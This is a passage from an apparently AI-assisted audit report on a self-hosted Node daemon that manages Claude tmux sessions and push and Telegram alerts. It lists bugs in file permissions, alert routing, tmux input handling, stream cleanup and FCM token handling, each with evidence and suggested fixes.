huginn-appd.js:637 `fs.mkdirSync(CHATS_DIR, { recursive: true });` (no mode -> 0777&~umask), :655-656 `fs.mkdirSync(chatDir(meta.id), { recursive: true }); fs.writeFileSync(metaPath(meta.id), JSON.stringify(rest, null, 2));` (no mode -> 0666&~umask), :675 `fs.appendFileSync(msgsPath(id), JSON.stringify(rec) + '\n');` (no mode). Contrast the same file's deliberate 0600 on every other state write — :1447, :1480, :1515, :1669 all pass `{ mode: 0o600 }`, and lib/accounts.js:134 passes `mode: 0o700` — so private is plainly the intent. RAN, fresh scratch DATA_DIR + one scratch chat via POST /v1/chats on a scratch daemon (port 18788, own token file, killed and removed after): `drwxr-xr-x <DATA_DIR>` / `drwxr-xr-x <DATA_DIR>/chats` / `drwxr-xr-x <DATA_DIR>/chats/<chat-uuid>` / `-rw-r--r-- <DATA_DIR>/chats/<chat-uuid>/meta.json` — note `drwx------ <DATA_DIR>/accounts` in the same run, proving the umask-independent path was taken for accounts and not for chats. The live host matches: `/var/lib/huginn-appd/chats` is drwxr-xr-x and its meta.json/messages.jsonl are -rw-r--r--; only the top `/var/lib/huginn-appd` is drwx------, and grep across the whole repo for any chmod/install -d/mkdir of `var/lib/huginn-appd` returns nothing — deploy.sh only touches /opt/huginn-appd.
```

</details>

**Verifier's correction:** None to the claim. One qualification for severity calibration: the trigger is a crash-consistency window (SIGKILL/OOM between O_TRUNC and write, or ext4 writeback loss after power cut), not something an API caller can force, and the blast radius is one chat — messages.jsonl survives and is recoverable by hand. That keeps it MED rather than higher, and the fix is the same tmp+rename the other seven writers already use.

**Suggested fix:** Two independent belts, because either alone is fragile: (1) add `UMask=0077` to the unit — PROVEN compatible, `systemd-run -p UMask=0077` produced `drwx------` dirs and `-rw-------` files with no other effect, and `systemd-analyze security` already flags `✗ UMask= Files created by service are world-readable by default`; (2) make it umask-independent in code — create DATA_DIR/CHATS_DIR/chatDir with `{ recursive: true, mode: 0o700 }` and pass `{ mode: 0o600 }` to the meta write, matching what the other four state writes already do. Note fs.writeFileSync's mode arg only applies on creation, so also chmod existing chat files once on startup if the intent is to fix already-deployed trees.

### `server/appd/huginn-appd.js:1841`

An HTTP 200 from FCM is treated as proof the owner was reached, but FCM returns 200 for a force-stopped or standby-throttled app that will never see the message — so exactly the case the Telegram fallback was built for is the case that suppresses it.

**lane** alerting / watch / FCM push / push tokens / notify claim · **contract** C7 · **verdict** not separately verified

**What goes wrong:** The owner force-stops the Huginn app from Android settings (or the app sits unopened long enough to land in the App Standby "rare" bucket, where high-priority FCM is quota-limited). Force-stop also cancels the app's alarms, so no heartbeat check-in ever arrives and the phone stops posting its own notifications. A session then blocks on a permission prompt: deliverPush gets a 200 (the token is still valid), pushedAny becomes true, routeAlerts holds the alert, and the FCM message is dropped by Android with a 1800s TTL. Nothing appears on the phone and nothing appears in Telegram. The session waits indefinitely and no channel ever says so.

<details><summary>Evidence</summary>

```
lib/fcm.js:14-16 states the assumption plainly: "The cost is that a force-stopped app receives nothing, which is exactly the case the Telegram fallback exists for." But huginn-appd.js:1837-1850 does `if (r.sent > 0) { pushedAny = true; ... }` / `const appReached = pushedAny || clientsLib.appOnline(...)`, and r.sent counts FCM ACCEPTING the message (`if (res.ok) return { ok: true, ... }`, fcm.js:99), not the device receiving it. A force-stopped Android app keeps a VALID token — FCM never answers UNREGISTERED for it — so pushedAny is true forever. Live state supports this: GET /v1/alerts shows {"pushed":196, "delivered":2, "lastAt":1785201054} — 196 pushes against 2 Telegram messages ever, the last of them ~8 days ago; and every alert in 3 days of journal reads `alerts: held <kind> for <x> (pushed to the app)`.
```

</details>

**Suggested fix:** Stop treating FCM acceptance as delivery for the fallback decision. Either have the app acknowledge receipt (a POST /v1/push/ack, or fold pushesReceived into the existing /v1/watch check-in) and let the host require a recent ack before counting a push as reaching anyone, or keep the current optimism but add a floor: if a session_attention alert is still in the attention state N minutes later and no client has checked in since, send it to Telegram regardless of the earlier 200.

### `server/appd/huginn-appd.js:1850`

routeAlerts is given one batch-wide appOnline, so an alert whose OWN push failed is withheld from Telegram because a different alert in the same tick pushed successfully — and its transition is then consumed, so no later tick can re-decide it.

**lane** alerting / watch / FCM push / push tokens / notify claim · **contract** C7 · **verdict** not separately verified

**What goes wrong:** One tick decides two alerts: session_resolved for `andrev` (answered in tmux) and session_attention for `pprobe` (a real blocking question). deliverPush(andrev) returns 200 so pushedAny=true; deliverPush(pprobe) hits a transient FCM 503/timeout and returns sent:0. appReached is now true, so routeAlerts holds the pprobe question back from Telegram; the held loop clears its guard, and st.prev = observation consumes the running->attention edge. The question is never pushed, never sent to Telegram, and never re-decided. Recovery depends entirely on the phone's own /v1/watch baseline — the exact dependency the Telegram fallback exists not to have.

<details><summary>Evidence</summary>

```
huginn-appd.js:1841-1856:
  let pushedAny = false;
  const pushedKeys = new Set();
  for (const a of alerts) {
    const r = await deliverPush(a);
    if (r.sent > 0) { pushedAny = true; pushedKeys.add(a.key); }
  }
  const appReached = pushedAny || clientsLib.appOnline(clientState, now);
  ...
  const { deliver, held } = routeAlerts(news, { mode: st.mode || 'fallback', appOnline: appReached });
pushedKeys already records the per-alert answer and is used one block later (line 1869: `if (!pushedKeys.has(a.key)) delete sentUpdates[a.key];`) — but the routing decision ignores it. Clearing the guard cannot resurrect the alert: huginn-appd.js:1887-1892 documents that "decideAlerts only fires on a TRANSITION ... so once this observation is saved as `prev`, the transition is consumed and no later tick can re-decide it", and the compensating rollback at 1900 covers only `undelivered` (Telegram failures), never `held`.
```

</details>

**Suggested fix:** Route per alert, not per batch: `const reached = (a) => pushedKeys.has(a.key) || clientsLib.appOnline(clientState, now); const deliver = news.filter(a => st.mode === 'always' || (st.mode !== 'off' && !reached(a)));` — or call routeAlerts once per alert with its own appOnline. Also extend the `undelivered` rollback to alerts that were held with neither a push nor a fresh client behind them.

### `server/appd/huginn-appd.js:1900`

The "edge kept for retry" rollback is a no-op for a chat created AND finished inside one tick window: st.prevAt is advanced unconditionally, so the born-since-prev test can never be true again and the finish is permanently lost despite the log claiming it was kept.

**lane** alerting / watch / FCM push / push tokens / notify claim · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The owner asks a one-line question from the phone at 09:00:01; the chat finishes at 09:00:03; the alert tick at 09:00:10 decides chat_finished. FCM has no registered device (or the send fails) and the WAN link is blipping so send-telegram.sh exits 1. The daemon logs "reached nobody — edge kept for retry", deletes the chat from the observation, and sets prevAt=09:00:10. Every subsequent tick sees c1 absent from prev with createdAt 09:00:01 < prevAt, treats it as history, and skips it. The answer is never announced on any channel, ever — while the log says it was queued for retry.

<details><summary>Evidence</summary>

```
huginn-appd.js:1900-1924 rolls the subject back — `const before = (prevObs.chats || {})[a.subject]; if (before) observation.chats[a.subject] = before; else delete observation.chats[a.subject];` and logs `alerts: ${a.kind} for ${a.subject} reached nobody — edge kept for retry` — then unconditionally does `st.prev = observation; st.prevAt = now;`. lib/alerts.js:191-194 is the only path that can re-fire it: `const bornSincePrev = prevAt > 0 && createdMs > prevAt; if (!bornSincePrev || ...) continue;`. Once prevAt has moved past the chat's createdAt, bornSincePrev is false forever.

RAN (scratchpad/repro-rollback.js, mirroring alertTickInner against /opt/huginn-appd/lib/alerts.js):
  tick1 (both channels fail): {"fired":["chat_finished"],"undelivered":1}
    st.prev.chats after rollback: {} prevAt= 10000
  tick2 (telegram healthy again): {"fired":[],"undelivered":0}
  tick3: {"fired":[],"undelivered":0}
```

</details>

**Suggested fix:** Do not advance prevAt past a rolled-back chat: keep the minimum createdAt of the rolled-back born-in-window chats (st.prevAt = Math.min(now, ...rolledBackCreatedMs - 1)), or better, keep an explicit `st.retry` list of undelivered alerts that the next tick re-delivers directly instead of trying to re-derive them from a transition that has been consumed.

### `server/appd/huginn-appd.js:2226`

In the /v1/watch stream loop a state event resets the keepalive timer without re-stamping the client, so a watcher connected through a period of state churn faster than 25s stops looking fresh after 3 minutes even though it is receiving everything.

**lane** alerting / watch / FCM push / push tokens / notify claim · **contract** C7 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Four Claude sessions are working concurrently (the normal state on this host — 18 tmux sessions exist right now). Each turn boundary flips a session between running and idle, so the digest hash changes every few seconds and the stream emits state events continuously. After 3 minutes the phone's foreground WatchService and the desktop both read fresh:false in GET /v1/clients even though both are connected and rendering; appOnline drops to false. If push is unconfigured or its send fails, routeAlerts now delivers to Telegram as well, so the owner gets the same alert twice — the duplicate-channel outcome clients.js:20-30 says teaches the reader to ignore both. It also breaks the diagnostic the module was written for: "did my phone keep checking in overnight?" answers no for a phone that did.

<details><summary>Evidence</summary>

```
huginn-appd.js:2210-2233 — noteClient(req, 'stream') is called once before the loop (line 2194) and then ONLY inside the keepalive branch (line 2232). The state branch ends with `nextKeepalive = Date.now() + KEEPALIVE_MS;` (line 2226) and no noteClient, and the keepalive is an `else if`, so any tick that emits state postpones the only re-stamp. clients.js:31 gives streams FRESH_STREAM_MS = 180_000, and clients.js:78 is `if (now - (c.lastAt || 0) < freshnessFor(c.kind)) return true;` — after 180s of continuous state churn the connected client reads fresh:false and appOnline ignores it.
RAN: a 300s scratch stream (X-Huginn-Client: audit-lane-stream-probe, X-Huginn-Notify: 0) against the live daemon during a QUIET period logged `state, ka, ka, ka, state, ka, ka, ka, ka, ka, ka` at 27s spacing — the keepalive path works when the digest is still, which is precisely why the starvation is invisible until the host is busy. Live listing also shows the Compose desktop with checkIns: 399 across firstAt 1785481913 (5 days), far below one stamp per 25s of connected time.
```

</details>

**Suggested fix:** Call noteClient(req, 'stream') on every loop iteration that writes anything (move it above the if/else, or add it to the state branch). A stamp is an in-memory mutation plus a dirty flag flushed once a minute, so the cost is nil.

### `server/appd/huginn-appd.js:2452`

Routine refresh-token rotation is indistinguishable from sign-in completion: both the login-session janitor and the code-wait loop treat any fingerprint change of the live credentials as 'the sign-in finished'.

**lane** lib/accounts.js + lib/autoswitch.js + lib/usage.js + lib/plan.js — account identity and switching · **contract** C8 · **verdict** CONFIRMED (CONFIRMED:1)

**What goes wrong:** (a) Owner opens the add-account flow, is in the browser for two minutes; a running session refreshes tokens; the settings screen's next /v1/accounts poll kills the login tmux session; pasting the code returns 409 'no sign-in is in progress'. (b) Rotation lands inside the 20s post-paste window: the loop declares done while `claude auth login` is still exchanging the code, kills the session mid-exchange, and returns done:true with captured = the OLD account's email -> mismatch:true confusion and a lost sign-in.

<details><summary>Evidence</summary>

```
Line 2452 (code wait): `if (fingerprint(accounts.readActive()) !== before)` then kills the login session (2457) and reports done:true; line 2297 (GET /v1/accounts): `if (loginStartedFrom && fingerprint(live) && fingerprint(live) !== loginStartedFrom)` -> `tmux kill-session -t =login`. accounts.js:25-27 states fingerprints change on rotation 'several times a day' — C8's own premise that fingerprints rotate is why they cannot serve as a completion signal.
```

</details>

**Verifier's correction:** None to the claim. One calibration: it needs a rotation to land inside a short window of a rare flow, so it is a timing coincidence rather than an everyday failure; MED is kept because scenario (b) does not merely abort the flow, it reports {"done":true,"message":"Signed in"} for a sign-in that did not complete, which is a wrong answer rather than a lost one. Whether `claude auth status` (called by the daemon at login start and on every /v1/accounts) itself triggers a rotation — which would make this frequent rather than coincidental — could not be tested without touching the live credentials, so it is left unproven.

**Suggested fix:** Detect completion by identity, not fingerprint: resolve the accountUuid at login start and compare `(await resolveIdentity(readActive()))?.uuid` at detection time, falling back to fingerprint only when the network is unavailable; in the janitor (2297) additionally require the login pane to report done/exited.

### `server/appd/huginn-appd.js:2547`

POST /v1/sessions reports 201 with a session name that does not exist whenever the requested name contains a '.', because tmux renames it to '_' and the daemon echoes back the name it asked for rather than the one tmux created.

**lane** command and tmux injection in appd · **verdict** CONFIRMED (CONFIRMED:1) · **demonstrated by running it**

**What goes wrong:** Owner taps "new session" in the app and names it `netplan.audit`. The daemon returns 201 {name:"netplan.audit"}; the app navigates to that session and every route 404s, so a session that was just created successfully appears broken/missing. It only becomes reachable after a manual list refresh reveals the real name `netplan_audit`.

<details><summary>Evidence</summary>

```
```js
2542: const name = canonName(body.name);           // NAME_RE (:225) allows '.'
2544: if (await sessionExists(name)) return sendErr(res, 409, ...);
2546: const { err, stderr } = await run('tmux',
2547:   ['new-session', '-d', '-s', name, '-c', WORKDIR, 'claude; exec "$SHELL" -l']);
2548: if (err) return sendErr(res, 500, ...);
2549: return sendJson(res, 201, { ok: true, name });   // `name`, not what tmux made
```
The 409 pre-check is also blind here: `sessionExists('a.b')` runs `has-session -t '=a.b'`, which tmux parses as session `a` + pane `.b` and fails, so an existing `a_b` is not detected as a collision.

RAN IT against the LIVE daemon:
```
$ curl -X POST .../v1/sessions -d '{"name":"audit-inj.v2"}'
{"ok":true,"name":"audit-inj.v2"}
$ tmux list-sessions -F '#{session_name}' | grep audit-inj
audit-inj_v2
$ curl -o /dev/null -w '%{http_code}' .../v1/sessions/audit-inj.v2/transcript   -> 404
$ curl -o /dev/null -w '%{http_code}' -X POST .../v1/sessions/audit-inj.v2/keys -> 404
$ curl .../v1/sessions | grep audit-inj
{"sessions":[{"name":"audit-inj_v2" ...
```
```

</details>

**Verifier's correction:** None; if anything the finding understates it — the blind 409 pre-check does not merely miss a collision, it turns the retry into a 500 ("tmux: duplicate session") rather than the 409 the route intends.

**Suggested fix:** Same root fix as the rename finding — remove '.' from NAME_RE, and return the name tmux actually created (`tmux display-message -p -t <newly created id> '#{session_name}'`) rather than the requested one.

### `server/appd/huginn-appd.js:2699`

Text whose last character is ';' has that character silently eaten by tmux's argument parser (a lone ';' is dropped entirely), and the daemon reports {"ok":true} regardless.

**lane** command and tmux injection in appd · **verdict** CONFIRMED (CONFIRMED:1) · **demonstrated by running it**

**What goes wrong:** Owner uses live typing to send a shell one-liner ending in a semicolon, or the client's keystroke batcher flushes a chunk that happens to end on a ';' the user just typed (e.g. `for f in *.log;` then a pause). The daemon answers ok:true, the character never arrives, and the pane shows text the user did not type — a shell line that then runs as a single malformed command, or a Claude message with a character missing. Nothing in the response or the log records the loss.

<details><summary>Evidence</summary>

```
`send-keys -l -- <text>` does not protect a trailing semicolon: tmux treats a ';'-terminated argument as a command separator even after `--`. `\;` is the escape, and the daemon never applies it:
```js
2699: const r = await run('tmux', ['send-keys', '-t', `=${name}:`, '-l', '--', body.text]);
2700: if (r.err) return sendErr(res, 500, ...);   // r.err is null — tmux exits 0
```
That this tmux really splits on ';' argv elements is proven by the daemon's own deliberate use of it at :515 (`';', 'capture-pane', ...` chains two commands in one process).

RAN IT — raw tmux boundary probe on a scratch session (everything else is literal, so the defect is specific to a TRAILING ';'):
```
sent 'a;b'      -> got a;b      (embedded ';' survives)
sent 'foo;'     -> got foo      (trailing ';' STRIPPED)
sent 'foo\;'    -> got foo;     (backslash is the fix)
sent 'a\nb'     -> got a\nb     (no escape processing — good)
sent '-l'       -> got -l       ('--' works — good)
sent 'Enter'    -> got Enter    (no key-name ambiguity in -l mode — good)
```
RAN IT against the LIVE daemon on a scratch session:
```
$ curl -X POST .../v1/sessions/audit-inj-keys/keys -d '{"text":"echo one; echo two;","keys":["Enter"]}'
{"ok":true}
pane received: echo one; echo two          <-- trailing ';' gone
$ curl -X POST ... -d '{"text":";","keys":["Enter"]}'
{"ok":true}
pane received: (empty line)                <-- nothing at all
```
```

</details>

**Verifier's correction:** None — the claim is exactly right, including that only a TRAILING ';' is affected (embedded ones survive) and that the daemon still answers ok:true. Severity kept at MED: silent single-character loss on the message-send path (a pasted code line ending in ';' is an ordinary input), acknowledged as success, with no log trace.

**Suggested fix:** Escape the payload before handing it to tmux — replace a trailing ';' with '\\;' (or every ';' with '\\;', which the probe shows round-trips correctly) — or switch the literal path to `send-keys -H` with hex bytes, which has no argument-parsing surface at all.

### `server/appd/huginn-appd.js:2836`

serveDesktopArtifact pipes an fs.ReadStream to the response without destroying it when the client disconnects, so every aborted installer download leaks a file descriptor that is never reclaimed and pins the artifact's inode even after the file is deleted.

**lane** appd route authorization and HTTP surface · **verdict** CONFIRMED by lead (L12) · **demonstrated by running it**

**What goes wrong:** The Electron desktop client (or the Compose client on /v1/desktop-kt) starts downloading Huginn-Setup-x.y.z.exe (~90MB) over the tailnet/Yggdrasil and the owner closes the app, sleeps the laptop, or the mesh link drops mid-transfer. huginn-appd keeps the read fd forever. The next release moves a new installer into DATA_DIR/desktop and the release script deletes the old one - but the daemon still holds fds on the old inode, so ~90MB per leaked fd stays allocated on huginn's root filesystem, invisible to `du` and only visible as unexplained `df` usage. The fd count also only ever grows for the daemon's whole uptime (weeks); nothing short of `systemctl restart huginn-appd` reclaims either resource.

<details><summary>Evidence</summary>

```
Code (2828-2838):
    const serveDesktopArtifact = (dir, name) => {
      const found = desktopLib.resolveArtifact(dir, name);
      if (!found.ok) return sendErr(res, found.status, found.error);
      res.writeHead(200, { 'Content-Type': found.contentType, 'Content-Length': found.size });
      const stream = fs.createReadStream(found.file);
      stream.pipe(res);
      stream.on('error', () => { try { res.destroy(); } catch { } });
    };
There is no `res.on('close', () => stream.destroy())`. Node's pipe() only unpipes (pauses) the source when the destination closes; it never destroys it, so the fd stays open forever.

RAN against an isolated scratch daemon (127.0.0.1:8799, own DATA_DIR, 60MB artifact staged in DATA_DIR/desktop):
  fds before: 22
  20 aborted downloads issued  -> fds after: 42, fds pointing at the artifact: 20
  fds after 25s: 42 (20 still on the artifact - not GC-reclaimed)
  another 40 aborts            -> fds now: 82, on the artifact: 60
Second run, 40MB artifact, 3 aborts then `rm` the artifact:
  leaked fds on artifact: 3
  lr-x------ ... 23 -> .../desktop/Huginn-Setup-9.9.9.exe (deleted)
  lr-x------ ... 24 -> .../desktop/Huginn-Setup-9.9.9.exe (deleted)
  lr-x------ ... 25 -> .../desktop/Huginn-Setup-9.9.9.exe (deleted)
  inode still allocated (deleted): 3
No request log line is produced for any of these (see the res.on('finish') finding), so the leak is invisible in the journal.
```

</details>

**Suggested fix:** Destroy the source stream when the response closes, or use stream.pipeline: `const stream = fs.createReadStream(found.file); res.on('close', () => stream.destroy()); stream.pipe(res);` - or replace the whole body with `require('node:stream').pipeline(fs.createReadStream(found.file), res, () => {})`, which destroys both ends on any termination.

### `server/appd/huginn-appd.js:2888`

The 413 "that file is too large" response can never reach the client, because the over-cap handler destroys the request socket before the response is written.

**lane** lib/uploads.js + lib/desktop.js — upload spool and release-artifact serving · **verdict** CONFIRMED (CONFIRMED:1) · **demonstrated by running it**

**What goes wrong:** The owner shares a 200 MB NVR export or Proxmox backup to the phone app. HuginnClient.uploadStream (core/.../HuginnClient.kt:516) issues `post("/v1/uploads")` and gets an IOException from the reset instead of an HTTP 413 with a JSON body, so `decode()` never runs. The app surfaces a generic connectivity error ("could not reach huginn" / socket closed) and the user retries the same file over the same link — the one carefully-worded message that would tell them the actual limit, "that file is too large (max 128MB)", is unreachable code. This is the same class of wall the 2026-07-29 policy change was written to remove.

<details><summary>Evidence</summary>

```
Code (huginn-appd.js:2888-2891, 2900-2904):
        const stop = (err) => { failed = err; try { req.destroy(); } catch { } out.destroy(); reject(err); };
        req.on('data', (chunk) => { bytes += chunk.length;
          if (bytes > UPLOAD_MAX_BYTES) return stop(new Error('too large')); ...
      } catch {
        ...
        return sendErr(res, 413, `that file is too large (max ${mb}MB)`);
`req.destroy()` tears down the underlying socket, so the later `sendErr` writes to a dead connection.

RAN: a scratch harness on 127.0.0.1:18801 transcribing this exact block with the cap scaled to 1 MB; POSTing 4 MB:
  > POST /x HTTP/1.1
  < HTTP/1.1 100 Continue
  * Recv failure: Connection reset by peer
  body bytes: (empty)
  LOG: HANDLER-EXIT(too-large)
The server logged the rejection; the client received a TCP reset and zero response bytes.
```

</details>

**Verifier's correction:** -

**Suggested fix:** Write the 413 before killing the connection: on cap breach, stop reading with `req.pause()` and `req.unpipe?.()`, send the 413 via `sendErr`, then `res.end()` and only afterwards `req.destroy()` (or `req.socket.destroy()` on the 'finish' of the response). Destroying the request first guarantees the reply is lost.

### `server/appd/lib/agents.js:136`

`listAgents` and `agentLastLine` are called by the daemon on every session listing but are never referenced by any test, even though lib/agents.js has a test file that covers only its helpers.

**lane** test coverage map — find the next TermKeys · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The `delete a.file` at lib/agents.js:169 is dropped during a refactor (it looks like leftover bookkeeping). Every `/v1/sessions` response now leaks absolute host transcript paths (/root/.claude/projects/-slug/<uuid>/subagents/agent-*.jsonl) to every client. The appd suite reports 385/385. Same shape for ordering: swapping the sort comparator makes the WorkStrip show the oldest agent first on both clients, silently.

<details><summary>Evidence</summary>

```
RAN (python scan of every exported symbol in lib/*.js against the concatenated test corpus):
  agents.js: NO TEST REFERENCE -> ['agentLastLine', 'listAgents', 'ACTIVE_S', 'RECENT_S']  (of which used by daemon: ['listAgents'])
  models.js: NO TEST REFERENCE -> ['discoverModels']  (of which used by daemon: ['discoverModels'])
test/agents.test.js requires only `{ agentsDirFor, listAgentFiles, agentTask }` plus `journalSummaries` — 7 tests, none touching the composed function. `listAgents` (lib/agents.js:136-172) is where the untested composition lives: the RECENT_S=45min cut, the mtime sort, the `max=24` slice, the per-workflow journal read keyed on `a.workflow`, and the `delete a.file` that strips the absolute transcript path out of the response. `agentLastLine` (114) is the only reader of readTranscript's tail for agent rows.
```

</details>

**Suggested fix:** Add listAgents tests using the fsImpl injection the function already accepts: assert (a) rows older than RECENT_S are excluded, (b) output is newest-mtime-first, (c) at most `max` rows, (d) `file` is absent from every returned row, (e) a workflow row carries its journal summary and a direct row carries null, (f) journalSummaries is read once per workflow, not once per row.

### `server/appd/lib/alerts.js:173`

session_resolved unconditionally clears the 30-minute repeat guard for its session, so a session flapping attention -> idle -> attention pushes on every flap with no rate limit at all — the exact outcome the guard is documented to prevent.

**lane** alerting / watch / FCM push / push tokens / notify claim · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Session `huginndesktop` bounces between attention and idle roughly once a minute (observed live). Each attention pushes a high-priority FCM data message that posts a lock-screen prompt card with answer buttons; each resolution pushes again and cancels it. The owner's phone buzzes and the notification flickers ~6 times in under 3 minutes, and every one of those pushes also increments the per-install counter. The 30-minute guard that exists to stop exactly this never engages, because the resolution between the two questions deletes it.

<details><summary>Evidence</summary>

```
lib/alerts.js:163-174 — for a session that left 'attention' it pushes an alert AND writes `sentUpdates[`session:${name}`] = 0;` (pruneSent then drops the key entirely). huginn-appd.js:1863-1869 states the opposite intent: "Held because a PUSH delivered it: the owner has been told, so the repeat guard must stand — otherwise a session flapping in and out of attention pushes every time with no rate limit at all."

RAN (scratchpad/repro-flap.js, against /opt/huginn-appd/lib/alerts.js):
  REPEAT_MS = 30 minutes
  t+0s    attention : [ 'session_attention' ]
          guard     : {"session:s":1700000000000}
  t+94s   idle      : [ 'session_resolved' ]
          guard     : {}                      <-- guard erased
  t+101s  attention : [ 'session_attention' ]
  t+160s  idle      : [ 'session_resolved' ]
  t+166s  attention : [ 'session_attention' ]

LIVE CONFIRMATION (journalctl -u huginn-appd, 2026-08-04):
  12:57:32 push: delivered session_attention ... (SM-F966U) / alerts: held session_attention for huginndesktop
  12:59:06 push: delivered session_resolved
  12:59:13 push: delivered session_attention ... / held session_attention for huginndesktop
  13:00:06 push: delivered session_resolved
  13:00:12 push: delivered session_attention ... / held session_attention for huginndesktop
  13:00:49 push: delivered session_resolved
Three attention pushes for one session inside 160 seconds against a 30-minute guard, plus three cancels.
```

</details>

**Suggested fix:** Do not clear the guard on every resolution. Either (a) clear it only when the resolution is older than some minimum (e.g. the question was answered more than 60s after it was asked), or (b) key the attention guard on the prompt fingerprint (promptFingerprint is already computed in the enricher) so a genuinely NEW question gets through while the same question re-appearing stays suppressed, or (c) keep the guard and let decideAlerts fire again only when the fingerprint differs.

### `server/appd/lib/fcm.js:113`

Any HTTP 404 marks the registration dead regardless of the error code, so a project-level or infrastructure 404 unregisters every device in one tick — the fleet-wide failure the surrounding comment says it exists to prevent.

**lane** alerting / watch / FCM push / push tokens / notify claim · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The Firebase project huginn-push-monahan is renamed/deleted, or the service-account key is replaced with one lacking project_id, or an egress proxy answers the FCM host with a 404 error page. On the next alert tick deliverPush walks every device, each send returns 404, r.dead is true for all of them, and huginn-appd.js:1570 calls pushLib.drop for each — push.json is emptied. From then on deliverPush returns {sent:0} and the whole push path is silently dead (GET /v1/push shows devices: []) until the owner happens to open the Android app so it re-registers.

<details><summary>Evidence</summary>

```
lib/fcm.js:113 — `dead: DEAD_TOKEN_CODES.has(code) || res.status === 404,`. The comment above it (lines 30-34) rejects INVALID_ARGUMENT precisely because "one bad message ... would be read as every device being dead and would unregister the whole fleet in a single tick", but `res.status === 404` reintroduces the same class. gtoken.js:61 also allows a keyless project: `this.projectId = this.key.project_id || null;` while the constructor only validates client_email/private_key — so a key without project_id posts to `/v1/projects/null/messages:send`.

RAN (scratchpad/repro-fcm404.js, against /opt/huginn-appd/lib/fcm.js and lib/pushtokens.js):
  project-404  -> {"ok":false,"dead":true,"status":404,"error":"Requested entity was not found."}   (body status was PERMISSION_DENIED, not a dead-token code)
  html-404     -> {"ok":false,"dead":true,"status":404,"error":"<html>404 Not Found</html>"}
  no project_id-> projectId = null
  tokens before: 1
  tokens after a non-JSON 404: 0
```

</details>

**Suggested fix:** Drop the bare status check: `dead: DEAD_TOKEN_CODES.has(code)` only, since FCM always supplies UNREGISTERED/NOT_FOUND in error.details/error.status for a genuinely gone registration. Additionally reject a key with no project_id in the ServiceAccount constructor (same place client_email/private_key are validated) so `projects/null` can never be built, and consider refusing to drop more than one device per tick.

### `server/appd/lib/pane.js:398`

parseStatusLine cannot parse accept-edits mode — the live hint line is '⏵⏵ accept edits on (shift+tab to cycle)' and the regex demands a literal word 'mode', so every screen payload reports liveMode:null whenever a session is in accept-edits.

**lane** lib/pane.js — prompt detector and all pane-reading regexes (C2) · **verdict** CONFIRMED (CONFIRMED:1) · **demonstrated by running it**

**What goes wrong:** Owner puts a session in accept-edits (a standard shift+tab stop); phone/desktop mode indicator and mode control show unknown/stale for as long as the session stays there, and any client logic keyed on liveMode treats the session as mode-less — 1 of the 4 real permission modes is invisible end-to-end.

<details><summary>Evidence</summary>

```
Regex: /^[⏵⏴⏸⏹▶]{1,2}\s*(\w+)\s+mode\s+on/. LIVE-PROVEN by cycling shift+tab in the scratch session: '⏸ manual mode on'=>mode 'manual', '⏸ plan mode on'=>'plan', '⏵⏵ auto mode on'=>'auto', but '⏵⏵ accept edits on (shift+tab to cycle) · ← for agents' => mode:null (captured verbatim, parsed via the daemon's own function). huginn-appd.js:614-616 ships this as liveMode on every screen payload.
```

</details>

**Verifier's correction:** Accurate, with one refinement: the clients do not render 'unknown' — both fall back to the transcript's permissionMode, so the mode chip shows the PREVIOUS mode (stale/wrong) rather than blank, and only goes null when no transcript value exists. Impact is display/feedback-only (the chip is a label, no logic branches on liveMode), so MED is the ceiling, justified by the blind-cycle chip lying about 1 of the 4 stops. Note the fix must also reconcile naming: the pane says 'manual' where the transcript enum says 'default'.

**Suggested fix:** Match the hint by shape: /^[⏵⏴⏸⏹▶]{1,2}\s*(.+?)\s+on\b/ then strip a trailing ' mode', yielding 'accept edits' (normalize to 'acceptEdits' if clients expect the enum).

### `server/appd/lib/pushtokens.js:40`

register() rebuilds the install record without carrying `pushes`/`lastPushAt`, so a token rotation resets the host's per-install tally to 0 and permanently disables the phone's push-deficit watchdog (the host can then never report sending more than the phone received).

**lane** alerting / watch / FCM push / push tokens / notify claim · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Firebase reissues the registration token (reinstall, device restore, or at its own discretion — pushtokens.js's own header lists these). POST /v1/push/register replaces the record and the host's tally for that install drops from 196 to 0. The phone's DataStore still says 196 received. If FCM delivery then breaks for real — the service-account key is rotated, the project loses the FCM API, the app lands in the App Standby "rare" bucket — the host keeps counting sends (1, 2, 3...) and the phone keeps seeing pushesSent <= pushesReceived, so it stays on the RELAXED one-hour alarm and never tightens to the ten-minute fallback cadence. The watchdog that exists to distinguish "a quiet night" from "a broken delivery path" is blind for the next 196 pushes, i.e. effectively forever.

<details><summary>Evidence</summary>

```
lib/pushtokens.js:40-47 — `tokens[installId] = { token, firstAt: prev?.firstAt ?? now, seenAt: now, model: ..., failures: 0 };` — `pushes` and `lastPushAt` are absent, so sentTo() (line 142-145) returns 0 afterwards. huginn-appd.js:2224 and 2269 hand that number to the phone as `pushesSent`; Heartbeat.kt:96-98 is `if (pushesReceived > 0L && pushesSent <= pushesReceived) RELAXED_INTERVAL_MS else INTERVAL_MS`, and SettingsStore.kt:130-135 only ever increments PUSHES_RECEIVED — it is never reset.

RAN (scratchpad/repro-rotation.js, against /opt/huginn-appd/lib/pushtokens.js):
  after 196 delivered pushes: sentTo = 196  totals = {"pushed":196,"lastPushAt":2}
  rotation: {"changed":true,"rotated":true}
  after rotation:            sentTo = 0  totals = {"pushed":196,"lastPushAt":2}
  phone received=196, host sentTo=0  -> RELAXED 60m
  ...and after 50 more pushes ALL SILENTLY LOST, host sentTo=50 -> RELAXED 60m
(196 is the live figure from GET /v1/alerts on the running daemon: "pushed": 196.)
```

</details>

**Suggested fix:** Carry the delivery history across a rotation: `pushes: prev?.pushes ?? 0, lastPushAt: prev?.lastPushAt ?? 0` in the new record (firstAt is already carried, so the intent is clearly to keep per-install history). Add a test asserting sentTo() is unchanged by a rotation.

### `server/appd/lib/transcript.js:397`

The suppression of `[Image: original WxH...]` captions and `[Your previous response...]` nudges is defeated: describeMachineText returns null but humanRemainder does not strip those two patterns, so the full machine text is pushed back as a kind:'user' bubble.

**lane** lib/transcript.js — transcript reading, paging, and rendering data · **verdict** CONFIRMED (CONFIRMED:1) · **demonstrated by running it**

